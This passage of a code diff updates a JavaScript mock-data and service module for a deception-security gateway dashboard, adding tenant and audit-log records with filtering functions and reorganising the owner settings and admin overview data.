-    webhookEndpoint: "https://siem.apexfintech.internal/webhooks/deception-events"
+  {
+    id: "aud-503",
+    timestamp: "1 hr ago",
+    isoTimestamp: "2026-10-25T14:44:00Z",
+    actor: "marcus.vance@gateway-admin.internal",
+    actorRole: "Security Operations Analyst",
+    action: "QUARANTINE_IP_RANGE",
+    category: "Security & Quarantines",
+    target: "Range 198.51.100.0/24 placed into Persistent Honeynet diversion",
+    tenantId: "tenant-aerodyn-8823",
+    tenantName: "AeroDynamics Defence Lab",
+    result: "Success",
+    ip: "10.14.0.88",
+    details: "Threat intelligence feed flagged IP CIDR as active scanner origin; automated tarpit enforced."
   },
-  teamMembers: [
-    {
-      id: "tm-1",
-      name: "Alex Vance",
-      email: "alex.vance@apexfintech.io",
-      role: "Security Principal (Owner)",
-      status: "Active",
-      lastLogin: "Active Now"
-    },
-    {
-      id: "tm-2",
-      name: "Elena Rostova",
-      email: "elena.r@apexfintech.io",
-      role: "Lead Cloud Architect",
-      status: "Active",
-      lastLogin: "2 hours ago"
-    },
-    {
-      id: "tm-3",
-      name: "David Kim",
-      email: "david.kim@apexfintech.io",
-      role: "DevOps / SRE Engineer",
-      status: "Active",
-      lastLogin: "Yesterday"
-    },
-    {
-      id: "tm-4",
-      name: "Priya Patel",
-      email: "priya.p@apexfintech.io",
-      role: "Incident Responder",
-      status: "Invited (Simulated)",
-      lastLogin: "Never"
-    }
-  ]
-};
+  {
+    id: "aud-504",
+    timestamp: "2 hrs ago",
+    isoTimestamp: "2026-10-25T13:44:00Z",
+    actor: "sarah.chen@gateway-admin.internal",
+    actorRole: "Principal Gateway Operator",
+    action: "CANARY_TOKEN_ROTATION",
+    category: "Canary Secrets",
+    target: "Global JWT Secret Canary Keys Rotated",
+    tenantId: "all",
+    tenantName: "All Platform Tenants",
+    result: "Success",
+    ip: "10.14.0.52",
+    details: "Routine 30-day cryptographic canary key rotation completed across all ingress proxy edge pods."
+  },
+  {
+    id: "aud-505",
+    timestamp: "3 hrs ago",
+    isoTimestamp: "2026-10-25T12:44:00Z",
+    actor: "alex.kumar@gateway-admin.internal",
+    actorRole: "Platform SRE",
+    action: "TENANT_PROVISION_UPDATE",
+    category: "Tenant Config",
+    target: "Tenant: QuantEdge Capital (tenant-quant-7712) Ingress Verified",
+    tenantId: "tenant-quant-7712",
+    tenantName: "QuantEdge Capital",
+    result: "Success",
+    ip: "10.14.0.31",
+    details: "Verified dedicated Equinix NY4 10Gbps cross-connect ingress link for ultra-low latency FIX service."
+  },
+  {
+    id: "aud-506",
+    timestamp: "4 hrs ago",
+    isoTimestamp: "2026-10-25T11:44:00Z",
+    actor: "sarah.chen@gateway-admin.internal",
+    actorRole: "Principal Gateway Operator",
+    action: "RATE_LIMIT_ADJUSTED",
+    category: "Policy",
+    target: "Tenant: OmniLogistics Global - WebSocket Handshake Rate Ceiling",
+    tenantId: "tenant-omni-4401",
+    tenantName: "OmniLogistics Global",
+    result: "Success",
+    ip: "10.14.0.52",
+    details: "Increased allowed concurrent connection upgrade bursts from 600 to 1200 conn/sec."
+  },
+  {
+    id: "aud-507",
+    timestamp: "6 hrs ago",
+    isoTimestamp: "2026-10-25T09:44:00Z",
+    actor: "marcus.vance@gateway-admin.internal",
+    actorRole: "Security Operations Analyst",
+    action: "DECOY_TEMPLATE_IMPORT",
+    category: "Decoy Scaling",
+    target: "FHIR Diagnostic Decoy Profile v2.4 Loaded",
+    tenantId: "tenant-medsecure-1022",
+    tenantName: "MedSecure Health Net",
+    result: "Success",
+    ip: "10.14.0.88",
+    details: "Imported synthetic HL7 FHIR v4 resource models for enhanced medical API honeypot authenticity."
+  },
+  {
+    id: "aud-508",
+    timestamp: "8 hrs ago",
+    isoTimestamp: "2026-10-25T07:44:00Z",
+    actor: "unauthorized-api-client",
+    actorRole: "External Ingress Request",
+    action: "ADMIN_POLICY_MUTATION_ATTEMPT",
+    category: "Security & Quarantines",
+    target: "Cluster Ingress Configuration API (/v1/admin/cluster)",
+    tenantId: "all",
+    tenantName: "Global Control Plane",
+    result: "Denied",
+    ip: "203.0.113.199",
+    details: "Rejected unauthenticated PUT request attempting to disable deception orchestrator."
+  }
+];
 
 // --- Storage Accessors & Local Persistence Layer ---
 
@@ -490,25 +940,101 @@ function setStoredApps(apps) {
   }
 }
 
-function getStoredSettings() {
+function getStoredTenants() {
   try {
-    const raw = localStorage.getItem(STORAGE_KEY_SETTINGS);
-    if (raw) return JSON.parse(raw);
+    const raw = localStorage.getItem(STORAGE_KEY_TENANTS);
+    if (raw) {
+      const parsed = JSON.parse(raw);
+      if (Array.isArray(parsed) && parsed.length > 0) return parsed;
+    }
   } catch (e) {
-    console.warn("Could not read stored settings, using defaults", e);
+    console.warn("Could not read stored tenants, using defaults", e);
   }
-  return DEFAULT_OWNER_SETTINGS;
+  return DEFAULT_TENANTS;
 }
 
-function setStoredSettings(settings) {
-  try {
-    localStorage.setItem(STORAGE_KEY_SETTINGS, JSON.stringify(settings));
-  } catch (e) {
-    console.warn("Could not persist settings", e);
-  }
-}
+// --- Public Service Methods for Tenants (Stage 2B.1) ---
 
-// --- Public Service Methods for Applications ---
+export const getTenants = async (filters = {}) => {
+  let list = [...getStoredTenants()];
+
+  if (filters.search) {
+    const q = filters.search.toLowerCase().trim();
+    list = list.filter(t =>
+      t.name.toLowerCase().includes(q) ||
+      t.id.toLowerCase().includes(q) ||
+      t.tier.toLowerCase().includes(q) ||
+      t.contactEmail.toLowerCase().includes(q) ||
+      (t.description && t.description.toLowerCase().includes(q))
+    );
+  }
+
+  if (filters.status && filters.status !== 'all') {
+    list = list.filter(t => t.status === filters.status);
+  }
+
+  if (filters.tier && filters.tier !== 'all') {
+    list = list.filter(t => t.tier === filters.tier);
+  }
+
+  return list;
+};
+
+export const getTenantById = async (id) => {
+  const tenants = getStoredTenants();
+  return tenants.find(t => t.id === id) || null;
+};
+
+export const getTenantApplications = async (tenantId) => {
+  const apps = getStoredApps();
+  return apps.filter(a => a.tenantId === tenantId);
+};
+
+export const getTenantEvents = async (tenantId) => {
+  return DEFAULT_SECURITY_EVENTS.filter(e => e.tenantId === tenantId);
+};
+
+export const getTenantAuditEvents = async (tenantId) => {
+  return DEFAULT_AUDIT_LOGS.filter(a => a.tenantId === tenantId || a.tenantId === 'all');
+};
+
+// --- Public Service Methods for Health & Audit Logs (Stage 2B.1) ---
+
+export const getGatewayHealthComponents = async () => {
+  return [...DEFAULT_COMPONENT_HEALTH];
+};
+
+export const getPlatformAuditLogs = async (filters = {}) => {
+  let list = [...DEFAULT_AUDIT_LOGS];
+
+  if (filters.search) {
+    const q = filters.search.toLowerCase().trim();
+    list = list.filter(a =>
+      a.id.toLowerCase().includes(q) ||
+      a.actor.toLowerCase().includes(q) ||
+      a.action.toLowerCase().includes(q) ||
+      a.target.toLowerCase().includes(q) ||
+      a.tenantName.toLowerCase().includes(q) ||
+      a.details.toLowerCase().includes(q)
+    );
+  }
+
+  if (filters.category && filters.category !== 'all') {
+    list = list.filter(a => a.category === filters.category);
+  }
+
+  if (filters.result && filters.result !== 'all') {
+    list = list.filter(a => a.result === filters.result);
+  }
+
+  if (filters.tenantId && filters.tenantId !== 'all') {
+    list = list.filter(a => a.tenantId === filters.tenantId || a.tenantId === 'all');
+  }
+
+  return list;
+};
+
+// --- Public Service Methods for Applications (Owner Portal) ---
 
 export const getApplications = async () => {
   return [...getStoredApps()];
@@ -525,6 +1051,8 @@ export const createApplication = async (newAppData) => {
   const newApp = {
     ...newAppData,
     id: `app-${String(nextNumber).padStart(2, '0')}`,
+    tenantId: newAppData.tenantId || "tenant-apex-9941",
+    tenantName: newAppData.tenantName || "Apex FinTech Cloud",
     status: newAppData.status || "shielded",
     requestsPerSec: 0,
     requestVolume: "0 reqs/day",
@@ -573,6 +1101,9 @@ export const getSecurityEvents = async (filters = {}) => {
   if (filters.applicationId && filters.applicationId !== 'all') {
     list = list.filter(e => e.applicationId === filters.applicationId);
   }
+  if (filters.tenantId && filters.tenantId !== 'all') {
+    list = list.filter(e => e.tenantId === filters.tenantId);
+  }
   if (filters.severity && filters.severity !== 'all') {
     list = list.filter(e => e.severity === filters.severity);
   }
@@ -602,7 +1133,6 @@ export const getSecurityEventById = async (id) => {
 };
 
 export const getApplicationTraffic = async (appId) => {
-  // Generate realistic time-series for a specific application
   return [
     { time: "00:00", requests: 12000, diverted: 35, blocked: 8 },
     { time: "03:00", requests: 8400, diverted: 22, blocked: 4 },
@@ -616,6 +1146,24 @@ export const getApplicationTraffic = async (appId) => {
 };
 
 // --- Public Service Methods for Settings ---
+
+function getStoredSettings() {
+  try {
+    const raw = localStorage.getItem(STORAGE_KEY_SETTINGS);
+    if (raw) return JSON.parse(raw);
+  } catch (e) {
+    console.warn("Could not read stored settings, using defaults", e);
+  }
+  return DEFAULT_OWNER_SETTINGS;
+}
+
+function setStoredSettings(settings) {
+  try {
+    localStorage.setItem(STORAGE_KEY_SETTINGS, JSON.stringify(settings));
+  } catch (e) {
+    console.warn("Could not persist settings", e);
+  }
+}
 
 export const getOwnerSettings = async () => {
   return getStoredSettings();
@@ -634,7 +1182,65 @@ export const updateOwnerSettings = async (patch) => {
   return merged;
 };
 
-// --- Backward Compatible Overview Accessor for Stage 1 ---
+export const DEFAULT_OWNER_SETTINGS = {
+  organization: {
+    tenantName: "Apex FinTech Cloud",
+    tenantId: "tenant-apex-9941",
+    contactEmail: "security-ops@apexfintech.io",
+    environmentTier: "Enterprise Shield Tier",
+    timezone: "UTC (Coordinated Universal Time)",
+    dataResidency: "United States (US-East / US-West)"
+  },
+  displayPreferences: {
+    defaultTimeRange: "24h",
+    rowDensity: "compact",
+    autoRefreshInterval: 30,
+    showCanaryDetails: true
+  },
+  notificationPreferences: {
+    emailAlertsCritical: true,
+    emailAlertsHigh: true,
+    honeynetTriggerDigest: true,
+    webhookAlertsEnabled: false,
+    webhookEndpoint: "https://siem.apexfintech.internal/webhooks/deception-events"
+  },
+  teamMembers: [
+    {
+      id: "tm-1",
+      name: "Alex Vance",
+      email: "alex.vance@apexfintech.io",
+      role: "Security Principal (Owner)",
+      status: "Active",
+      lastLogin: "Active Now"
+    },
+    {
+      id: "tm-2",
+      name: "Elena Rostova",
+      email: "elena.r@apexfintech.io",
+      role: "Lead Cloud Architect",
+      status: "Active",
+      lastLogin: "2 hours ago"
+    },
+    {
+      id: "tm-3",
+      name: "David Kim",
+      email: "david.kim@apexfintech.io",
+      role: "DevOps / SRE Engineer",
+      status: "Active",
+      lastLogin: "Yesterday"
+    },
+    {
+      id: "tm-4",
+      name: "Priya Patel",
+      email: "priya.p@apexfintech.io",
+      role: "Incident Responder",
+      status: "Invited (Simulated)",
+      lastLogin: "Never"
+    }
+  ]
+};
+
+// --- Backward Compatible Overview Accessor for Stage 1 Owner Overview ---
 export const ownerSummaryMetrics = {
   reportingPeriod: "Last 24 Hours",
   tenantName: "Apex FinTech Cloud",
@@ -687,7 +1293,7 @@ export const ownerProtectedApps = DEFAULT_APPLICATIONS.slice(0, 5);
 export const ownerSecurityEvents = DEFAULT_SECURITY_EVENTS.slice(0, 5);
 
 export const getOwnerOverviewData = async () => {
-  const currentApps = getStoredApps();
+  const currentApps = getStoredApps().filter(a => a.tenantId === "tenant-apex-9941");
   return {
     metrics: {
       ...ownerSummaryMetrics,
@@ -705,15 +1311,15 @@ export const getOwnerOverviewData = async () => {
   };
 };
 
-// --- Gateway Administrator Mock Data (Preserved from Stage 1) ---
+// --- Gateway Administrator Mock Data (Extended for Stage 2B.1) ---
 
 export const adminSummaryMetrics = {
   platformHealth: "Operational",
   latency: "1.4 ms",
   activeNodes: "12 / 12 Nodes Online",
   totalTenants: {
-    value: 18,
-    subtext: "58 total protected applications registered across tenants",
+    value: 6,
+    subtext: "14 total protected applications registered across tenants",
     trend: "+2 this quarter"
   },
   platformRequests: {
@@ -753,139 +1359,23 @@ export const adminDeceptionVectors = [
   { vector: "Database Shadow Trap", engagements: 145 }
 ];
 
-export const adminComponentHealth = [
-  {
-    id: "comp-proxy",
-    name: "L7 Reverse Proxy & Ingress Filter",
-    status: "operational",
-    latency: "0.8ms",
-    cluster: "Edge-Cluster-US-East",
-    uptime: "99.99%"
-  },
-  {
-    id: "comp-ai",
-    name: "AI Behavioral Anomaly Detector",
-    status: "operational",
-    latency: "3.2ms",
-    cluster: "Inference-Worker-Pool-1",
-    uptime: "99.95%"
-  },
-  {
-    id: "comp-deception",
-    name: "Dynamic Deception Orchestrator",
-    status: "operational",
-    latency: "2.1ms",
-    cluster: "Decoy-Runtime-Vanguard",
-    uptime: "100.00%"
-  },
-  {
-    id: "comp-telemetry",
-    name: "Threat Telemetry & Event Stream Pipeline",
-    status: "operational",
-    latency: "1.2ms",
-    cluster: "Kafka-Ingest-Broker-A",
-    uptime: "99.98%"
-  },
-  {
-    id: "comp-policy",
-    name: "Tenant Isolation & Policy Engine",
-    status: "operational",
-    latency: "0.4ms",
-    cluster: "Core-Policy-Matrix",
-    uptime: "100.00%"
-  }
-];
-
-export const adminHighSeverityEvents = [
-  {
-    id: "adm-evt-101",
-    timestamp: "4 mins ago",
-    tenant: "Apex FinTech Cloud",
-    target: "Enterprise Admin Portal",
-    sourceIp: "198.51.100.44",
-    threatType: "Distributed Credential Stuffing & Session Hijack",
-    deceptionStatus: "Active in Sandboxed Honeynet",
-    severity: "critical"
-  },
-  {
-    id: "adm-evt-102",
-    timestamp: "19 mins ago",
-    tenant: "MedSecure Health Net",
-    target: "Patient Records FHIR API",
-    sourceIp: "203.0.113.12",
-    threatType: "Mass BOLA / IDOR Traversal Probe",
-    deceptionStatus: "Rerouted to Synthetic Patient Database",
-    severity: "critical"
-  },
-  {
-    id: "adm-evt-103",
-    timestamp: "45 mins ago",
-    tenant: "OmniLogistics Global",
-    target: "Fleet Dispatch WebSocket",
-    sourceIp: "192.0.2.78",
-    threatType: "Protocol Smuggling & Command Injection",
-    deceptionStatus: "Isolated in Containerized Shadow Sink",
-    severity: "high"
-  },
-  {
-    id: "adm-evt-104",
-    timestamp: "1 hr ago",
-    tenant: "AeroDynamics Defence Lab",
-    target: "Telemetry Ingestion Relay",
-    sourceIp: "198.51.100.198",
-    threatType: "Known Nation-State Scanning Signature (APT Probe)",
-    deceptionStatus: "Honey-token Fingerprint Dispatched",
-    severity: "critical"
-  }
-];
-
-export const adminAuditLog = [
-  {
-    id: "aud-501",
-    timestamp: "12 mins ago",
-    adminUser: "sarah.chen@gateway-admin.internal",
-    action: "POLICY_UPDATE",
-    target: "Tenant: Apex FinTech Cloud - Stricter SQLi Diversion Threshold",
-    status: "success",
-    ip: "10.14.0.52"
-  },
-  {
-    id: "aud-502",
-    timestamp: "38 mins ago",
-    adminUser: "system-orchestrator",
-    action: "DECOY_POOL_SCALED",
-    target: "Decoy-Cluster-US-East: Scaled from 30 to 45 containers",
-    status: "success",
-    ip: "10.14.0.1"
-  },
-  {
-    id: "aud-503",
-    timestamp: "2 hrs ago",
-    adminUser: "marcus.vance@gateway-admin.internal",
-    action: "QUARANTINE_IP_RANGE",
-    target: "Range 198.51.100.0/24 placed into Persistent Honeynet diversion",
-    status: "success",
-    ip: "10.14.0.88"
-  },
-  {
-    id: "aud-504",
-    timestamp: "4 hrs ago",
-    adminUser: "sarah.chen@gateway-admin.internal",
-    action: "CANARY_TOKEN_ROTATION",
-    target: "Global JWT Secret Canary Keys Rotated",
-    status: "success",
-    ip: "10.14.0.52"
-  }
-];
-
 export const getAdminOverviewData = async () => {
+  const tenants = getStoredTenants();
+  const apps = getStoredApps();
   return {
-    metrics: adminSummaryMetrics,
+    metrics: {
+      ...adminSummaryMetrics,
+      totalTenants: {
+        value: tenants.length,
+        subtext: `${apps.length} total protected applications registered across tenants`,
+        trend: "+2 this quarter"
+      }
+    },
     trends: adminPlatformTrends,
     vectors: adminDeceptionVectors,
-    components: adminComponentHealth,
-    highSeverityEvents: adminHighSeverityEvents,
-    auditEvents: adminAuditLog,
+    components: DEFAULT_COMPONENT_HEALTH,
+    highSeverityEvents: DEFAULT_SECURITY_EVENTS.slice(0, 4),
+    auditEvents: DEFAULT_AUDIT_LOGS.slice(0, 4),
     isDemoData: true
   };
 };
